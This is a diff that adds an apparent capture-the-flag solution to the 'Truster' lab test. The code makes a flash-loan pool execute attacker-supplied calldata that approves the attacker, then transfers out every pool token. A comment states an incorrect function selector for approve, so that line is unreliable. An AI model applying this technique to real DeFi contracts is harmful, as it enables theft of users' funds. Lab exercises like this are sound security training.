@@ -29,6 +29,27 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+
+        // i think we want to call the deployed DVT contract here, and call approve(attacker, TOKENS_IN_POOL)
+        // calldata: 
+        //  Keccak-256(approve) = 5219209e
+        //  attacker: pad address to 32 bytes
+        //  TOKENS_IN_POOL: pad to 32 bytes
+        //
+        [deployer, attacker] = await ethers.getSigners();
+
+        let ABI = [
+            "function approve(address spender, uint256 amount)"
+        ];
+        let iface = new ethers.utils.Interface(ABI);
+        const calldata = iface.encodeFunctionData("approve", [ attacker.address, TOKENS_IN_POOL ]);
+        console.log(calldata);
+        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, calldata);
+        console.log("made calldata call")
+        // now attacker should be approved to spend all of the tokens in the pool
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
+        console.log("transferred tokens");
+        console.log(await this.token.balanceOf(attacker.address));
     });
 
     after(async function () {
